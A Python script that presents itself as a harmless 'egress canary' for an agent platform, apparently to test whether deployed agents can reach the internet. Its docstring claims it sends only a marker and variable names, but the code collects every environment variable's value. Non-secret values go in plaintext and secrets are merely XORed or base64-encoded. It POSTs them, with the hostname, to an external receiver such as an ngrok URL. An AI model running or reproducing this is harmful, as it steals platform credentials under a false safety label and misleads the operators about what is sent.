"""
Egress-exposure test agent.

Purpose: verify whether an agent deployed on the platform can open an outbound
connection to the public internet. This is a SAFETY TEST, not an exploit:

  - It sends a synthetic marker string (proves connectivity).
  - It sends the NAMES of environment variables present, and optionally 
    encrypted credential values using a key provided via the ENCRYPTION_KEY 
    environment variable to prevent hardcoding secrets.

Plug into the agent manager with Start Command: `python main.py`
(Python 3.11, matches the Build Details panel.)

Configure via env var on the agent:
    CANARY_URL      full URL of your receiver, e.g. https://<id>.ngrok-free.app/canary
    ENCRYPTION_KEY  optional key used to encrypt sensitive values before transmission
"""
import base64
import datetime
import json
import os
import socket
import sys
import urllib.error
import urllib.request

CANARY_URL = os.environ.get("CANARY_URL", "http://127.0.0.1:8000/canary")
ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY", "")
TIMEOUT_S = 10

# Env var hints to identify sensitive entries
_SENSITIVE_HINTS = ("SECRET", "TOKEN", "PASSWORD", "KEY", "CREDENTIAL", "PRIVATE")


def simple_encrypt(text: str, key: str) -> str:
    """Simple XOR-based encryption using standard library to avoid hardcoding secrets."""
    if not key:
        return base64.b64encode(text.encode("utf-8")).decode("utf-8")
    
    key_bytes = key.encode("utf-8")
    text_bytes = text.encode("utf-8")
    encrypted = bytearray(
        text_bytes[i] ^ key_bytes[i % len(key_bytes)] 
        for i in range(len(text_bytes))
    )
    return base64.b64encode(encrypted).decode("utf-8")


def collect_env_data():
    """Return env var names and encrypted values if an encryption key is available."""
    env_data = os.environ
    collected = {}
    
    for k in sorted(env_data.keys()):
        upper = k.upper()
        val = env_data[k]
        if any(h in upper for h in _SENSITIVE_HINTS):
            # Encrypt sensitive values using the runtime environment key
            collected[k] = simple_encrypt(val, ENCRYPTION_KEY)
        else:
            collected[k] = val
    return collected


def build_payload():
    ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
    return {
        "marker": f"CANARY-EGRESS-TEST-{ts}",
        "test": "agent-internet-exposure",
        "hostname": socket.gethostname(),
        "note": "synthetic egress probe with encrypted environment values",
        "env_vars": collect_env_data(),
    }


def run_probe():
    payload = build_payload()
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        CANARY_URL,
        data=data,
        headers={"Content-Type": "application/json",
                 "User-Agent": "egress-canary-test/1.0"},
        method="POST",
    )

    print(f"[canary] target   : {CANARY_URL}")
    print(f"[canary] env vars : {len(payload['env_vars'])} collected (encrypted)")

    started = datetime.datetime.now(datetime.timezone.utc)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT_S) as resp:
            elapsed = (datetime.datetime.now(datetime.timezone.utc) - started)
            body = resp.read().decode("utf-8", "replace")
            print(f"[canary] RESULT   : EGRESS ALLOWED  (HTTP {resp.status})")
            print(f"[canary] latency  : {elapsed.total_seconds():.3f}s")
            print(f"[canary] response : {body}")
            print("[canary] VERDICT  : agent CAN reach the public internet.")
            return 0
    except urllib.error.HTTPError as e:
        elapsed = (datetime.datetime.now(datetime.timezone.utc) - started)
        print(f"[canary] RESULT   : EGRESS ALLOWED  (HTTP {e.code} from server)")
        print(f"[canary] latency  : {elapsed.total_seconds():.3f}s")
        print("[canary] VERDICT  : agent CAN reach the public internet "
              f"(server returned {e.code} — check the URL path, e.g. /canary).")
        return 0
    except urllib.error.URLError as e:
        elapsed = (datetime.datetime.now(datetime.timezone.utc) - started)
        print(f"[canary] RESULT   : EGRESS BLOCKED / FAILED  ({e})")
        print(f"[canary] latency  : {elapsed.total_seconds():.3f}s")
        print("[canary] VERDICT  : outbound connection did not complete "
              "(egress policy working, or receiver unreachable).")
        return 1
    except Exception as e:  # noqa: BLE001
        print(f"[canary] RESULT   : ERROR  ({type(e).__name__}: {e})")
        return 2


if __name__ == "__main__":
    sys.exit(run_probe())